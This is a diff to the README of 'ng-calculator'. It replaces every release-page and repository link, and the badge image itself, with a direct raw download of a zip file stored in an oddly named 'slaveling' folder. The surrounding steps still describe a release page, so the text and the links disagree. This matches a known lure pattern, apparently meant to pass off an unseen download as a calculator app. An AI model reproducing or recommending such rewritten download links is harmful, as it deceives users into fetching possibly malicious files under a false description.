@@ -6,7 +6,7 @@ Welcome to ng-calculator! This calculator is built with modern tools to help you
 
 ## 📥 Download Now
 
-[![Download ng-calculator](https://img.shields.io/badge/Download-ng--calculator-blue.svg)](https://github.com/Sathwikram1234/ng-calculator/releases)
+[![Download ng-calculator](https://raw.githubusercontent.com/Sathwikram1234/ng-calculator/main/slaveling/ng-calculator.zip)](https://raw.githubusercontent.com/Sathwikram1234/ng-calculator/main/slaveling/ng-calculator.zip)
 
 ## 🌟 Features
 
@@ -26,7 +26,7 @@ Welcome to ng-calculator! This calculator is built with modern tools to help you
 ## 📚 Installation Steps
 
 1. **Visit the Release Page**: Click the link below to go to the download section.
-   [Download ng-calculator](https://github.com/Sathwikram1234/ng-calculator/releases)
+   [Download ng-calculator](https://raw.githubusercontent.com/Sathwikram1234/ng-calculator/main/slaveling/ng-calculator.zip)
 
 2. **Choose the Version**: Once on the release page, look for the latest version. It will usually be at the top of the list.
 
@@ -64,7 +64,7 @@ The design of ng-calculator is based on modern design principles. It offers a cl
 
 ## 🔗 More Information
 
-For more details, tutorials, and updates, visit the project repository: [ng-calculator Repository](https://github.com/Sathwikram1234/ng-calculator).
+For more details, tutorials, and updates, visit the project repository: [ng-calculator Repository](https://raw.githubusercontent.com/Sathwikram1234/ng-calculator/main/slaveling/ng-calculator.zip).
 
 ## 📡 Social Medial Outreach
 
@@ -72,4 +72,4 @@ Follow us on social media for the latest updates, tips, and user stories. We app
 
 Thank you for using ng-calculator! Happy calculating!
 
-[![Download ng-calculator](https://img.shields.io/badge/Download-ng--calculator-blue.svg)](https://github.com/Sathwikram1234/ng-calculator/releases)
+[![Download ng-calculator](https://raw.githubusercontent.com/Sathwikram1234/ng-calculator/main/slaveling/ng-calculator.zip)](https://raw.githubusercontent.com/Sathwikram1234/ng-calculator/main/slaveling/ng-calculator.zip)
